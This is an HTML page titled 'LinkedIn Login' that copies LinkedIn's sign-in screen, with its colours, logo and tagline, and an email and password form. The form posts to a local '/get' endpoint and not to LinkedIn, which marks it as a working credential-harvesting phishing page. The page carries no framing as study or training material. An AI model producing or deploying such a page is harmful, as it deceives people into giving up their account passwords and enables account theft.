<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>LinkedIn Login</title>
    <style>
      body {
        font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif;
        background-color: #f3f2ef;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 350px;
        text-align: center;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-h1 {
        font-size: 32px;
        font-weight: 600;
        color: rgba(0,0,0,0.9);
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 14px;
        color: rgba(0,0,0,0.6);
        margin-bottom: 32px;
      }
      .g-input {
        width: 100%;
        padding: 10px 12px;
        border: 1px solid rgba(0,0,0,0.6);
        border-radius: 4px;
        font-size: 16px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
        background: #fff;
      }
      .g-input:focus {
        border-color: #0a66c2;
        box-shadow: 0 0 0 1px #0a66c2;
      }
      .gbtn-primary {
        width: 100%;
        padding: 12px 24px;
        background-color: #0a66c2;
        color: #fff;
        border: none;
        border-radius: 28px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background-color: #004182;
      }
      .or {
        display: flex;
        align-items: center;
        margin: 18px 0;
        color: rgba(0,0,0,0.6);
        font-size: 14px;
        font-weight: 600;
      }
      .or::before, .or::after {
        content: '';
        flex: 1;
        border-bottom: 1px solid rgba(0,0,0,0.25);
      }
      .or span {
        padding: 0 16px;
      }
      .social-btn {
        width: 100%;
        padding: 0 24px;
        height: 40px;
        background: #fff;
        border: 1px solid #dadce0;
        border-radius: 28px;
        color: rgba(0,0,0,0.75);
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin-bottom: 12px;
      }
      .social-btn:hover {
        background: #f5f5f5;
        border-color: #c2c2c2;
      }
      .forgot {
        display: block;
        margin-top: 20px;
        color: rgba(0,0,0,0.6);
        font-size: 14px;
        text-decoration: none;
        font-weight: 600;
      }
      .forgot:hover {
        color: #0a66c2;
        text-decoration: underline;
      }
      .footer {
        margin-top: 24px;
        font-size: 12px;
        color: rgba(0,0,0,0.6);
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 84 21" width="102" height="25">
        <path fill="#0a66c2" d="M12.5 2.75a2.25 2.25 0 1 0-4.5 0 2.25 2.25 0 0 0 4.5 0zM8 8h3.5v12H8V8zm5.5 0H17v1.6h.05c.5-1 1.7-2 3.5-2 3.8 0 4.5 2.5 4.5 5.7V20h-3.5v-5.9c0-1.4 0-3.2-2-3.2s-2.3 1.5-2.3 3.1V20H13.5V8zM3 8h3.5v12H3V8zm-3 0h3.5v12H0V8z"/>
        <path fill="#0a66c2" d="M28 8h3.5v12H28V8zm-1.75-4.25a2.12 2.12 0 1 0 0 4.25 2.12 2.12 0 0 0 0-4.25zM38.2 8h-3.2v-1h-3.5v13h3.5v-7.2c0-2.5.5-3.8 2.8-3.8.8 0 1.4.1 1.9.3V8.2c-.5-.2-1-.3-1.5-.3zM48.3 8h-3.2v-1h-3.5v13h3.5V13c0-2.3.5-3.6 2.8-3.6.8 0 1.4.1 1.9.3V8.2c-.5-.2-1-.3-1.5-.3zM58.5 8h-3.2v-1h-3.5v13h3.5V13c0-2.3.5-3.6 2.8-3.6.8 0 1.4.1 1.9.3V8.2c-.5-.2-1-.3-1.5-.3zM67.6 8h-3.2v-1h-3.5v13h3.5V13c0-2.3.5-3.6 2.8-3.6.8 0 1.4.1 1.9.3V8.2c-.5-.2-1-.3-1.5-.3zM73 8h3.5v1.6h.05c.5-1 1.7-2 3.5-2 3.8 0 4.5 2.5 4.5 5.7V20H81v-5.9c0-1.4 0-3.2-2-3.2s-2.3 1.5-2.3 3.1V20H73V8z"/>
      </svg>
      <h1 class="g-h1">Sign in</h1>
      <p class="g-h2">Stay updated on your professional world</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="email" placeholder="Email or phone">
        <input class="g-input" type="password" name="password" placeholder="Password">
        <button type="submit" class="gbtn-primary">Sign in</button>
      </form>
      <a href="#" class="forgot">Forgot password?</a>
      <p class="footer">New to LinkedIn? <a href="#" style="color:#0a66c2;text-decoration:none;font-weight:600">Join now</a></p>
    </div>
  </body>
</html>
